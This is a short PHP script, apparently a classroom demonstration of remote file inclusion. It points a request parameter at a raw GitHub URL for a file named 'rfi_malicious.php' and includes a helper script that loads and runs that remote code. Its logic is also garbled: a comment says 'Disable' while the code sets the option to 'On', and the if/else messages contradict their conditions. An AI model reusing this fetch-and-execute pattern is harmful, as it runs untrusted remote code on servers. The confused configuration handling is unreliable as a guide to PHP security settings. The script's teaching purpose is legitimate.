<?php

// Check if allow_url_include is enabled
if (ini_get('allow_url_include')) {
    // Disable allow_url_include in php.ini
    ini_set('allow_url_include', 'On');

    // Display a message explaining the change
    echo "This is a simulation. We have set 'allow_url_include' to On in php.ini.<br>\n
    This is a security risk because it allows to execute any file on the server if the parameter in php.ini is set to On.<br>\n
    We have uploaded a malicious file on a public repository on GitHub and we are going to execute it.<br>\n";
} else {
    echo "allow_url_include is already set to On in php.ini.<br>";
}

// Set the file parameter to the malicious file URL
$_GET['file'] = 'https://raw.githubusercontent.com/Kotsudes/devinci-cracks/main/rfi_malicious.php';


echo "\n\nExecuting the file: " . $_GET['file'] . "<br>\n";
// Include the rfi_parse.php script
include('rfi_parse.php');

// Add any additional logic or code related to rfi_parse.php here

?>